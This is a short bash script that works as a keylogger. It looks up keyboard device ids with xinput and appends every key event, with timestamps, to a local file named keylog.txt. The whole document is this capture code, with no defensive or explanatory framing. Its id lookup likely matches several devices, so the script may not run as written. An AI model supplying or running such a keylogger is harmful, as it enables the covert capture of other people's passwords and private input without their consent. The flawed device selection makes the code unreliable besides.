#!/bin/bash

# Get the id of the keyboard device
keyboard_id=$(xinput list | grep -i 'keyboard' | grep -o 'id=[0-9]*' | grep -o '[0-9]*')

# Check if we found a keyboard id
if [ -z "$keyboard_id" ]; then
    echo "No keyboard device found"
    exit 1
fi

# Log file
logfile="keylog.txt"

# Start logging
echo "Logging started. Press Ctrl+C to stop."
xinput test $keyboard_id | while read line; do
    echo $(date +"%Y-%m-%d %H:%M:%S") "$line" >> $logfile
done
